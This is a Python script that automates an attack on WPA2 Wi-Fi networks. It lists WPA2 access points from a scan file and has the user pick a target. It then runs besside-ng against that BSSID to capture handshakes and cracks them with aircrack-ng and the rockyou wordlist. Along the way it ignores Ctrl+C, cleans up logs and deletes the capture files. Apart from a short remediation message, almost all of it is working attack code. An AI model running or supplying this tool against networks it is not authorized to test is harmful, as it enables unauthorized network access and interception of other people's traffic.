import subprocess, signal, sys, time, os, shutil, csv, glob, time, threading

def identify_wpa2():
    file_path = "/mnt/data/access_points.txt"
    try:
        with open(file_path, mode='r') as file:
            csv_reader = csv.reader(file)
            vulnerable_aps = []
            for row in csv_reader:
                if "WPA2" in row[1]:
                    vulnerable_aps.append(row)
            if vulnerable_aps:
                print("Vulnerable Access Points Found:")
                for ap in vulnerable_aps:
                    print(f"SSID: {ap[2]}, BSSID: {ap[0]}, Encryption: {ap[1]}")
                    print(
                        "Note: Uses WPA2 encryption. While more secure than WEP, it's still less secure compared to WPA3.")
                    print("Remediation: Upgrade to WPA3 encryption for enhanced security.\n")
            else:
                print("No vulnerable access points found using WPA2 encryption.")
    except FileNotFoundError:
        print(f"The file {file_path} was not found.")
    except Exception as e:
        print(f"An error occurred while analyzing vulnerabilities: {e}")

def target_ap():
    file_path = "/mnt/data/access_points.txt"
    try:
        with open(file_path, mode='r') as file:
            csv_reader = csv.reader(file)
            wpa2_aps = []
            for row in csv_reader:
                if "WPA2" in row[1]:
                    wpa2_aps.append(row)

            if wpa2_aps:
                print("Select a Vulnerable Access Point by its index number:")
                for index, ap in enumerate(wpa2_aps):
                    print(f"{index}: SSID: {ap[2]}, BSSID: {ap[0]}, Encryption: {ap[1]}")

                selected_index = int(input("Enter the index number of the target AP: "))
                if 0 <= selected_index < len(wpa2_aps):
                    selected_ap = wpa2_aps[selected_index]
                    return selected_ap[2], selected_ap[0]  # Returning SSID and BSSID
                else:
                    print("Invalid index selected.")
                    return None, None
            else:
                print("No vulnerable access points found using WPA2 encryption.")
                return None, None

    except FileNotFoundError:
        print(f"The file {file_path} was not found.")
        return None, None
    except Exception as e:
        print(f"An error occurred: {e}")
        return None, None

def main(ap_mac, interface):
    def sigint_handler(signum, frame):
        print("Ctrl+C was pressed, but the script continues...")

    signal.signal(signal.SIGINT, sigint_handler)

    # Run besside-ng and handle files
    besside_ng(ap_mac, interface)

def besside_ng(ap_mac, interface):
    cmd = ["sudo", "besside-ng", "-b", ap_mac, interface]

    try:
        print("Running besside-ng, please wait...")
        subprocess.run(cmd)
    except Exception as e:
        print(f"An error occurred during besside-ng execution: {e}")
    finally:
        cleanup()

def cleanup():
    # Moving .cap files to wpacracking directory and deleting besside.log
    move_files()
    delete_file("./besside.log")

def move_files():
    dest_dir = "/mnt/data/wpacracking"
    if not os.path.exists(dest_dir):
        os.makedirs(dest_dir)

    for cap_file in ["./wep.cap", "./wpa.cap"]:
        src = cap_file
        dest = os.path.join(dest_dir, os.path.basename(cap_file))
        if os.path.exists(src):
            os.rename(src, dest)
            print(f"Moved {cap_file} to {dest_dir}")
        else:
            print(f"{cap_file} not found.")

def delete_file(filepath):
    if os.path.exists(filepath):
        os.remove(filepath)
        print(f"Deleted {filepath}")
    else:
        print(f"{filepath} not found.")

def crack():
    cap_file_path = "/mnt/data/wpacracking/wpa.cap"
    if not os.path.exists(cap_file_path):
        print("wpa.cap not found, cannot proceed with cracking.")
        return

    cmd = ["sudo", "aircrack-ng", cap_file_path, "-w", "/usr/share/wordlists/rockyou.txt"]

    try:
        print("Running aircrack-ng, please wait...")
        subprocess.run(cmd)
    except Exception as e:
        print(f"An error occurred during aircrack-ng execution: {e}")
    finally:
        # Delete cap files after attempting to crack
        delete_file("/mnt/data/wpacracking/wpa.cap")
        delete_file("/mnt/data/wpacracking/wep.cap")
